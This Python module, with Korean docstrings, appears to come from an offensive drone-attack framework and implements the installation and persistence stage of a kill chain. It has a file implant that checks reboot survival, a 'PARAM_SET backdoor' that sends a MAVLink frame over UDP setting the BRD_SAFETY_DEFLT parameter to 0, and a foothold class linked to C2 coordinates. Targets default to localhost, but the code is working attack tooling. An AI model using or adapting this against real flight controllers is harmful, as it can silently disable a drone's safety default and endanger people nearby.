"""설치/지속 실 메커니즘 — 파일 발판 · PARAM 백도어 · 발판 오케스트레이션.

killchain 5단계(Installation)를 모델에서 실 메커니즘으로. 결정론·로컬 검증.
"""
from __future__ import annotations

import os
from dataclasses import dataclass
from typing import Optional

from ..transport import build_mavlink_param_set_frame, udp_deliver


class FileImplant:
    """파일 기반 발판 — 설치 후 '재확인(재부팅 모사)'에도 잔존하면 지속 성공."""

    def __init__(self, path: str):
        self.path = path

    def install(self, payload: bytes) -> bool:
        os.makedirs(os.path.dirname(self.path) or ".", exist_ok=True)
        with open(self.path, "wb") as f:
            f.write(payload)
        return os.path.exists(self.path)

    def is_persistent(self, expect: Optional[bytes] = None) -> bool:
        """재부팅 모사: 파일을 새로 읽어 잔존·무결 확인."""
        if not os.path.exists(self.path):
            return False
        if expect is None:
            return True
        with open(self.path, "rb") as f:
            return f.read() == expect

    def remove(self) -> None:
        if os.path.exists(self.path):
            os.remove(self.path)


class ParamImplant:
    """PARAM_SET 백도어 — EEPROM 잔존 파라미터(재부팅 후에도 유지)를 mavlink-router 로 전달."""

    def __init__(self, host="127.0.0.1", port=14550):
        self.host, self.port = host, int(port)

    def install(self, param_id="BRD_SAFETY_DEFLT", value=0.0) -> int:
        """반환: 전달 바이트 수(>0 이면 프레임 실제 송신)."""
        frame = build_mavlink_param_set_frame(param_id, value)
        return udp_deliver(self.host, self.port, frame)


@dataclass
class Foothold:
    """발판 설치 + 지속 C2 재수립 좌표(§K 비콘과 연결)."""
    implant: FileImplant
    c2_host: str = "127.0.0.1"
    c2_port: int = 0

    def establish(self, payload: bytes) -> bool:
        return self.implant.install(payload)

    def survives_reboot(self, expect: bytes) -> bool:
        return self.implant.is_persistent(expect)
